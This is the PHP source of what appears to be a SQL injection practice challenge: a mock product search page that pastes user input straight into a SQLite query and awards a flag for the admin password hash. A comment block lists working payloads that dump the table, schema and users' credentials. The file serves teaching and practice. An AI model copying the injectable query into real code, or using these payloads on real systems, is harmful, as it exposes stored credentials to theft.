<?php
	// session_start();
	$query_str = '';
	$rows = [];
	$errors = [];
	$db_name = "wc1";

	// main query
	$seach_term = isset($_REQUEST['seach_term'])? trim($_REQUEST['seach_term']) : NULL;
	if($seach_term){
		$db = new PDO("sqlite:{$db_name}.sqlite");
		$query_str = "SELECT * FROM products WHERE name LIKE '%{$seach_term}%';";

		try{
			$q = $db->query($query_str);
			if($q) $rows = $q->fetchAll(PDO::FETCH_OBJ);
			else $errors[] = "Query error!";	
		}
		catch (Exception $e) {
			$errors[] = $e->getMsg();	
		}
		finally{
			$db = NULL;
		}
	}

	// flag dump based on answer
	$answer = isset($_REQUEST['answer'])? trim($_REQUEST['answer']) : NULL;
	if($answer){
		$db = new PDO("sqlite:{$db_name}.sqlite");
		$query_str = "SELECT * FROM users WHERE username = 'admin' AND password = :password;";

		try{
			$q = $db->prepare($query_str);
			$q->execute([':password' => $answer]);
			$r = $q->fetchAll(PDO::FETCH_OBJ);
			// else $errors[] = "Query error!";	
		}
		catch (Exception $e) {
			$errors[] = $e->getMsg();	
		}
		finally{
			$db = NULL;
		}
	}	

	/*
	1) dump rest of this table
	' or '1=1	// works

	2) dump meta data about db
	' UNION ALL SELECT 1, name, type, 1 FROM sqlite_master WHERE '1=1

	3) dump info from users table
	' UNION ALL SELECT id, username, password, id FROM users WHERE '1=1

	4) second command ifnored because query limited to single command
	';  SELECT id, username, password, id FROM users where '1=1

	*/
?>

<!doctype html>
<html>

<head>
	<title></title>
	<link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
</head>

<body>
	<nav class="navbar navbar-full navbar-dark bg-inverse" style='margin-bottom: 1rem;'>
		<h1 class="navbar-brand">Widget Co</h1>
		<form class="form-inline" method='POST' style='display:inline-block;'>
			<input class="form-control mr-sm-2" type="text" placeholder="Admin Password Hash" name='answer'>
			<button class="btn btn-primary my-2 my-sm-0" type="submit">Submit</button>
		</form>
		<?php if($answer && isset($r) && count($r)){?> 
		<span class='navbar-text btn btn-success'>Flag: {{flag}}</span>
		<?php } elseif($answer){?>
		<span class='navbar-text btn btn-danger'>Incorrect!</span>
		<?php } ?>
	</nav>

	<div class="container">
		<div class="row">
			<div class="col-sm-12">
				<p>Get the hashed admin password for the flag.</p>
			</div>
		</div>

		<div class="row">
			<div class="col-sm-12">
				<h2>Product Listing</h2>
			</div>
		</div>

		<?php if($seach_term){ ?>
		<div class="alert alert-<?php echo $errors? 'danger' : 'success' ?>">
			<p><?php echo $query_str;?></p>
			<?php foreach($errors as $e) echo "<p>$e</p>";?>
		</div>
		<?php } ?>

		<!-- search bar -->
		<div class="row">
			<div class="col-sm-6">
				<form method='post'>
					<fieldset class="form-group">
						<label for="seach_term">Search Products</label>

						<div class="input-group">
							<input type="text" class="form-control" name='seach_term' placeholder="Enter name">
							<span class="input-group-btn">
								<button type="submit" class="btn btn-primary">Search</button>
							</span>
						</div>

						<!-- <small class="text-muted">Please use alphanumerics only!</small> -->
					</fieldset>
					
				</form>
			</div>
		</div>

		<!-- display results -->
		<div class="row">
			<div class="col-sm-12">
		<table class='table'>
			<thead>
				<tr>
					<th>ID</th>
					<th>Name</th>
					<th>Type</th>
					<th>Price</th>
				</tr>
			</thead>
			<tbody>
				<?php foreach($rows as $row){ ?> 
					<tr>
					<?php foreach($row as $col){ ?>
						<td><?php echo $col; ?></td>
					<?php } ?>
					</tr>
				<?php } ?>
			</tbody>
		</table>
			</div>
		</div>

	</div>

	<footer>
		<div class="navbar navbar-fixed-bottom" style="background:lightgray;text-align: right;">
			Powered by PHP & SQLite
		</div>
	</footer>	
</body>

</html>